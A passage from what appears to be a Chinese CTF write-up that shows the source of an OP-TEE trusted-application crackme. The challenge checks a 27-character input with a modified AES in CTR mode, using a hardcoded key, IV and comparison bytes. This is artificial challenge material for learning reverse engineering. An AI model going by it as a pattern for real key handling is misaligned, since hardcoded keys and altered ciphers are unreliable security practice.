class="number">0x9e</span>,<span class="number">0x9f</span>,<span class="number">0x7a</span>,<span class="number">0xd4</span>,<span class="number">0x9d</span>,<span class="number">0xfe</span>,<span class="number">0x36</span>,<span class="number">0x88</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(data); i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(cmp[i] != data[i])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">sprintf</span>(buf, <span class="string">&quot;wrong %s&quot;</span>, who);</span><br><span class="line">			params[<span class="number">0</span>].memref.size = <span class="built_in">strlen</span>(buf) + <span class="number">1</span>;</span><br><span class="line">			TEE_MemMove(params[<span class="number">0</span>].memref.buffer, buf, params[<span class="number">0</span>].memref.size);</span><br><span class="line">			TEE_Free(buf);</span><br><span class="line">			<span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> *buf1 = TEE_Malloc(<span class="built_in">strlen</span>(who) + GREETING_LEN + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">sprintf</span>(buf1, <span class="string">&quot;right but it is a test ^_^%s&quot;</span>, who);</span><br><span class="line">	params[<span class="number">0</span>].memref.size = <span class="built_in">strlen</span>(buf1) + <span class="number">1</span>;</span><br><span class="line">	TEE_MemMove(params[<span class="number">0</span>].memref.buffer, buf1, params[<span class="number">0</span>].memref.size);</span><br><span class="line">	TEE_Free(buf1);</span><br><span class="line">	<span class="keyword">return</span> TEE_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点是bj888文件,采取了魔改原有aes的方法：</p>
<p>main.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2017, Linaro Limited</span></span><br><span class="line"><span class="comment"> * All rights reserved.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment"> * modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1. Redistributions of source code must retain the above copyright notice,</span></span><br><span class="line"><span class="comment"> * this list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 2. Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment"> * this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment"> * and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &quot;AS IS&quot;</span></span><br><span class="line"><span class="comment"> * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment"> * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE</span></span><br><span class="line"><span class="comment"> * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE</span></span><br><span class="line"><span class="comment"> * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR</span></span><br><span class="line"><span class="comment"> * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF</span></span><br><span class="line"><span class="comment"> * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS</span></span><br><span class="line"><span class="comment"> * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN</span></span><br><span class="line"><span class="comment"> * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)</span></span><br><span class="line"><span class="comment"> * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span></span><br><span class="line"><span class="comment"> * POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* OP-TEE TEE client API (built by optee_client) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tee_client_api.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For the UUID (found in the TA&#x27;s h-file(s)) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bj888_ta.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BJ888_TEST_BUFFER_SIZE	4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BJ888_TEST_KEY_SIZE	16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BJ888_BLOCK_SIZE		16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECODE			0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ENCODE			1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TEE resources */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">test_ctx</span> &#123;</span></span><br><span class="line">	TEEC_Context ctx;</span><br><span class="line">	TEEC_Session sess;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_tee_session</span><span class="params">(<span class="keyword">struct</span> test_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">	TEEC_UUID uuid = TA_BJ888_UUID;</span><br><span class="line">	<span class="type">uint32_t</span> origin;</span><br><span class="line">	TEEC_Result res;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize a context connecting us to the TEE */</span></span><br><span class="line">	res = TEEC_InitializeContext(<span class="literal">NULL</span>, &amp;ctx-&gt;ctx);</span><br><span class="line">	<span class="keyword">if</span> (res != TEEC_SUCCESS)</span><br><span class="line">		errx(<span class="number">1</span>, <span class="string">&quot;TEEC failed with code 0x%x&quot;</span>, res);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Open a session with the TA */</span></span><br><span class="line">	res = TEEC_OpenSession(&amp;ctx-&gt;ctx, &amp;ctx-&gt;sess, &amp;uuid,</span><br><span class="line">			       TEEC_LOGIN_PUBLIC, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;origin);</span><br><span class="line">	<span class="keyword">if</span> (res != TEEC_SUCCESS)</span><br><span class="line">		errx(<span class="number">1</span>, <span class="string">&quot;TEEC failed with code 0x%x origin 0x%x&quot;</span>,</span><br><span class="line">			res, origin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">terminate_tee_session</span><span class="params">(<span class="keyword">struct</span> test_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">	TEEC_CloseSession(&amp;ctx-&gt;sess);</span><br><span class="line">	TEEC_FinalizeContext(&amp;ctx-&gt;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_bj888</span><span class="params">(<span class="keyword">struct</span> test_ctx *ctx, <span class="type">int</span> encode)</span></span><br><span class="line">&#123;</span><br><span class="line">	TEEC_Operation op;</span><br><span class="line">	<span class="type">uint32_t</span> origin;</span><br><span class="line">	TEEC_Result res;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;op, <span class="number">0</span>, <span class="keyword">sizeof</span>(op));</span><br><span class="line">	op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT,</span><br><span class="line">					 TEEC_VALUE_INPUT,</span><br><span class="line">					 TEEC_VALUE_INPUT,</span><br><span class="line">					 TEEC_NONE);</span><br><span class="line"></span><br><span class="line">	op.params[<span class="number">0</span>].value.a = TA_BJ888_ALGO_CTR;</span><br><span class="line">	op.params[<span class="number">1</span>].value.a = TA_BJ888_SIZE_128BIT;</span><br><span class="line">	op.params[<span class="number">2</span>].value.a = encode ? TA_BJ888_MODE_ENCODE :</span><br><span class="line">					TA_BJ888_MODE_DECODE;</span><br><span class="line"></span><br><span class="line">	res = TEEC_InvokeCommand(&amp;ctx-&gt;sess, TA_BJ888_CMD_PREPARE,</span><br><span class="line">				 &amp;op, &amp;origin);</span><br><span class="line">	<span class="keyword">if</span> (res != TEEC_SUCCESS)</span><br><span class="line">		errx(<span class="number">1</span>, <span class="string">&quot;TEEC_InvokeCommand failed 0x%x origin 0x%x&quot;</span>,</span><br><span class="line">			res, origin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_key</span><span class="params">(<span class="keyword">struct</span> test_ctx *ctx, <span class="type">char</span> *key, <span class="type">size_t</span> key_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">	TEEC_Operation op;</span><br><span class="line">	<span class="type">uint32_t</span> origin;</span><br><span class="line">	TEEC_Result res;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;op, <span class="number">0</span>, <span class="keyword">sizeof</span>(op));</span><br><span class="line">	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,</span><br><span class="line">					 TEEC_NONE, TEEC_NONE, TEEC_NONE);</span><br><span class="line"></span><br><span class="line">	op.params[<span class="number">0</span>].tmpref.buffer = key;</span><br><span class="line">	op.params[<span class="number">0</span>].tmpref.size = key_sz;</span><br><span class="line"></span><br><span class="line">	res = TEEC_InvokeCommand(&amp;ctx-&gt;sess, TA_BJ888_CMD_SET_KEY,</span><br><span class="line">				 &amp;op, &amp;origin);</span><br><span class="line">	<span class="keyword">if</span> (res != TEEC_SUCCESS)</span><br><span class="line">		errx(<span class="number">1</span>, <span class="string">&quot;TEEC_InvokeCommand failed 0x%x origin 0x%x&quot;</span>,</span><br><span class="line">			res, origin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_iv</span><span class="params">(<span class="keyword">struct</span> test_ctx *ctx, <span class="type">char</span> *iv, <span class="type">size_t</span> iv_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">	TEEC_Operation op;</span><br><span class="line">	<span class="type">uint32_t</span> origin;</span><br><span class="line">	TEEC_Result res;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;op, <span class="number">0</span>, <span class="keyword">sizeof</span>(op));</span><br><span class="line">	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,</span><br><span class="line">					  TEEC_NONE, TEEC_NONE, TEEC_NONE);</span><br><span class="line">	op.params[<span class="number">0</span>].tmpref.buffer = iv;</span><br><span class="line">	op.params[<span class="number">0</span>].tmpref.size = iv_sz;</span><br><span class="line"></span><br><span class="line">	res = TEEC_InvokeCommand(&amp;ctx-&gt;sess, TA_BJ888_CMD_SET_IV,</span><br><span class="line">				 &amp;op, &amp;origin);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	if (res != TEEC_SUCCESS)</span></span><br><span class="line"><span class="comment">		errx(1, &quot;TEEC_InvokeCommand failed 0x%x origin 0x%x&quot;,</span></span><br><span class="line"><span class="comment">			res, origin);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cipher_buffer</span><span class="params">(<span class="keyword">struct</span> test_ctx *ctx, <span class="type">char</span> *in, <span class="type">char</span> *out, <span class="type">size_t</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">	TEEC_Operation op;</span><br><span class="line">	<span class="type">uint32_t</span> origin;</span><br><span class="line">	TEEC_Result res;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;op, <span class="number">0</span>, <span class="keyword">sizeof</span>(op));</span><br><span class="line">	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,</span><br><span class="line">					 TEEC_MEMREF_TEMP_OUTPUT,</span><br><span class="line">					 TEEC_NONE, TEEC_NONE);</span><br><span class="line">	op.params[<span class="number">0</span>].tmpref.buffer = in;</span><br><span class="line">	op.params[<span class="number">0</span>].tmpref.size = sz;</span><br><span class="line">	op.params[<span class="number">1</span>].tmpref.buffer = out;</span><br><span class="line">	op.params[<span class="number">1</span>].tmpref.size = sz;</span><br><span class="line"></span><br><span class="line">	res = TEEC_InvokeCommand(&amp;ctx-&gt;sess, TA_BJ888_CMD_CIPHER,</span><br><span class="line">				 &amp;op, &amp;origin);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	if (res != TEEC_SUCCESS)</span></span><br><span class="line"><span class="comment">		errx(1, &quot;TEEC_InvokeCommand failed 0x%x origin 0x%x&quot;,		</span></span><br><span class="line"><span class="comment">		res, origin);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="comment">//const char *g = (const char*)(op.params[1].tmpref.buffer);</span></span><br><span class="line">	<span class="comment">//for(int i = 0; i &lt; 32; i++)&#123;</span></span><br><span class="line">		<span class="comment">//printf(&quot;%02x&quot;,g[i]);</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *greeting = (<span class="type">const</span> <span class="type">char</span> *)(op.params[<span class="number">0</span>].tmpref.buffer);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,greeting);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">test_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">	<span class="type">char</span> key[BJ888_TEST_KEY_SIZE] = <span class="string">&quot;snbjklefsdcvfsyc&quot;</span>;</span><br><span class="line">	<span class="type">char</span> iv[BJ888_BLOCK_SIZE] = <span class="string">&quot;snbjklefsdcvfsyc&quot;</span>;</span><br><span class="line">	<span class="type">char</span> clear[BJ888_TEST_BUFFER_SIZE];</span><br><span class="line">	<span class="type">char</span> ciph[BJ888_TEST_BUFFER_SIZE];</span><br><span class="line">	<span class="type">char</span> temp[BJ888_TEST_BUFFER_SIZE];</span><br><span class="line">	<span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(argv[<span class="number">1</span>]); i++)&#123;</span><br><span class="line">        clear[i] = argv[<span class="number">1</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">27</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;wrong\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//printf(&quot;%s\n&quot;,clear);</span></span><br><span class="line">	<span class="comment">//printf(&quot;Prepare session with the TA\n&quot;);</span></span><br><span class="line">	prepare_tee_session(&amp;ctx);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Prepare encode operation\n&quot;);</span></span><br><span class="line">	prepare_bj888(&amp;ctx, ENCODE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Load key in TA\n&quot;);</span></span><br><span class="line">	<span class="comment">//memset(key, 0xa5, sizeof(key)); /* Load some dummy value */</span></span><br><span class="line">	set_key(&amp;ctx, key, BJ888_TEST_KEY_SIZE);</span><br><span class="line">	<span class="comment">//printf(&quot;key:::%02x,%02x,%02x\n&quot;,key[0],key[1],key[15]);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Reset ciphering operation in TA (provides the initial vector)\n&quot;);</span></span><br><span class="line">	<span class="comment">//memset(iv, 0, sizeof(iv)); /* Load some dummy value */</span></span><br><span class="line">	set_iv(&amp;ctx, iv, BJ888_BLOCK_SIZE);</span><br><span class="line">	<span class="comment">//printf(&quot;iv:::%02x,%02x,%02x\n&quot;,iv[0],iv[1],iv[15]);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//memset(clear, 0x5a, sizeof(clear)); /* Load some dummy value */</span></span><br><span class="line">	cipher_buffer(&amp;ctx, clear, ciph, BJ888_TEST_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">	terminate_tee_session(&amp;ctx);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>bj888.ta</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2017, Linaro Limited</span></span><br><span class="line"><span class="comment"> * All rights reserved.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment"> * modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1. Redistributions of source code must retain the above copyright notice,</span></span><br><span class="line"><span class="comment"> * this list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 2. Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment"> * this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment"> * and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &quot;AS IS&quot;</span></span><br><span class="line"><span class="comment"> * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment"> * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE</span></span><br><span class="line"><span class="comment"> * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE</span></span><br><span class="line"><span class="comment"> * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR</span></span><br><span class="line"><span class="comment"> * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF</span></span><br><span class="line"><span class="comment"> * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS</span></span><br><span class="line"><span class="comment"> * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN</span></span><br><span class="line"><span class="comment"> * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)</span></span><br><span class="line"><span class="comment"> * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span></span><br><span class="line"><span class="comment"> * POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tee_internal_api.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tee_internal_api_extensions.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bj888_ta.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BJ888128_KEY_BIT_SIZE		128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BJ888128_KEY_BYTE_SIZE		(BJ888128_KEY_BIT_SIZE / 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BJ888256_KEY_BIT_SIZE		256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BJ888256_KEY_BYTE_SIZE		